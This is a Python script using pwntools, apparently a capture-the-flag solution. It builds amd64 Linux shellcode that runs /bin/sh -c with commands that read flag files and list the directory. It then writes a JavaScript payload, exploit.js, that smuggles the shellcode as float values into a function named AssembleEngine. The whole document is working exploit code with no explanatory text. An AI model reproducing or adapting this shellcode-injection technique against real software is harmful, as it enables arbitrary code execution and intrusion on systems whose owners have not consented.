#!/usr/bin/env python3
import struct
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

CMD = b'cat flag.txt; cat flag; cat /flag.txt 2>/dev/null; cat /flag 2>/dev/null; ls -la'
# /bin/sh -c "<CMD>"
sc = asm(shellcraft.amd64.linux.execve('/bin/sh', ['sh', '-c', CMD.decode()], 0))
sc += b'\x90' * ((8 - len(sc) % 8) % 8)
chunks = [struct.unpack('<Q', sc[i:i+8])[0] for i in range(0, len(sc), 8)]

js = ("var buf=new ArrayBuffer(8);var b64=new BigUint64Array(buf);"
      "var f64=new Float64Array(buf);"
      "var chunks=[" + ",".join("0x%xn" % c for c in chunks) + "];"
      "var arr=new Array(chunks.length);"
      "for(var i=0;i<chunks.length;i++){b64[0]=chunks[i];arr[i]=f64[0];}"
      "AssembleEngine(arr);")
open('exploit.js', 'w').write(js)
print("shellcode bytes:", len(sc))
print(js[:200], "...")
